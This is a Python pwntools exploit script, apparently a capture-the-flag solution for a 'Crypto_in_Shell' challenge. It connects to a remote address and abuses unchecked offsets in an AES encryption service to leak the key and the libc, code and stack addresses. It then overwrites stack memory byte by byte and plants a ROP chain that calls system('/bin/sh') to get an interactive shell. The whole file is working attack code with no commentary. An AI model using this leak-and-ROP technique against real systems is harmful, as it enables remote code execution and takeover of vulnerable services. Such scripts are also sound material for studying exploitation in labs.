from pwn import *
from Crypto.Cipher import AES


def query(offset,size):
    global CNT
    r.sendline(str(offset))
    r.sendlineafter('size:',str(size))
    CNT+=1
    return r.recv((size//16+1)*16)

def decrypt(c):
    aes = AES.new(KEY,AES.MODE_ECB)
    xored = aes.decrypt(c)
    plain = b''
    for i in range(16):
        plain+=p8(xored[i]^IV[i])
    return plain

def encrypt(p):
    aes = AES.new(KEY,AES.MODE_ECB)
    xored = b''
    for i in range(16):
        xored+=p8(p[i]^IV[i])
    cipher = aes.encrypt(xored)
    return cipher

def set_counter(target_offset,mode=0):
    global CNT
    global IV
    while True:
        plaintext = p64(CNT)+p64(target_offset)
        ciphertext = encrypt(plaintext)
        if mode==1:
            if ciphertext[3]>=0x80 and ciphertext[3]<0xff:
                CNT = u32(query(target_offset,8)[:4])+0x100000001
                return
        else:
            if ciphertext[3]<0x80:
                CNT = u32(query(target_offset,8)[:4])+0x100000001
                return
        IV = query(-0x10,8)

def send_payload(target_offset,data,initial):
    global IV
    global CNT
    if len(initial)-0xf<len(data):
        print('initial too short')
        exit()
    tot_payload = []
    payload = ''
    for i,d in enumerate(data):
        print(i)
        while True:
            payload+=str(target_offset+i)+'\n'+str(8)+'\n'
            #CNT+=1
            if len(payload)>10000:
                tot_payload.append(payload)
                payload = ''
            initial = initial[:i]+encrypt(initial[i:i+16])+initial[i+16:]
            #res = query(target_offset+i,8)
            if initial[i]==d:
                break
    if payload!='':
        tot_payload.append(payload)
    cnt = 1
    for i in tot_payload:
        CNT+=(len(i.split('\n'))-1)//2
        print(hex(CNT),cnt,'/',len(tot_payload))
        cnt+=1
        r.send(i)
        while True:
            if r.recv(timeout=0.5)==b'':
                break

###Params
CNT = 0x100000000
KEY = b'\x00'*0x10
IV = b'\x00'*0x10

###Addr
#  libc2.27
buf_offset = 0x2023a0
bss_offset = 0x202800
stderr_struct_offset = 0x3ec680
code_self_ptr_offset = 0x202008
environ_offset = 0x3ee098
system_offset = 0x4f440
bin_sh_offset = 0x1b3e9a

###ROPgadget
L_pop_rdi = 0x2155f
L_nop = 0x2cadf

###Exploit
#r = process('./C',env={'LD_PRELOAD':'/home/student/05/b05902008/Crypto_in_Shell/libc.so.6'})
r = remote('3.113.219.89',31337)
KEY= query(-0x20,8)
stderr_struct_addr_E = query(-0x40,8)
stderr_struct_addr = u64(decrypt(stderr_struct_addr_E)[:8])
libc_base = stderr_struct_addr-stderr_struct_offset
print(hex(libc_base))

code_self_ptr_addr_E = query(-0x3a0,8)
code_self_ptr_addr = u64(decrypt(code_self_ptr_addr_E)[8:])
code_base = code_self_ptr_addr-code_self_ptr_offset
print(hex(code_base))

stack_addr_E = query((libc_base+environ_offset)-(code_base+buf_offset),8)
stack_addr = u64(decrypt(stack_addr_E)[:8])-0xf8
print(hex(stack_addr))


set_counter((stack_addr-0x28)-(code_base+buf_offset),mode=1)

stack_orig = query(stack_addr-(code_base+buf_offset),0x38)
fake_rbp = p64(code_base+bss_offset)
ROPchain = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+L_nop)+\
           p64(libc_base+system_offset)
payload = fake_rbp+ROPchain
send_payload(stack_addr-(code_base+buf_offset),payload,stack_orig)

send_payload((libc_base+environ_offset)-(code_base+buf_offset),p64(0),stack_addr_E+p64(0))

set_counter((stack_addr-0x28)-(code_base+buf_offset),mode=0)

r.interactive()
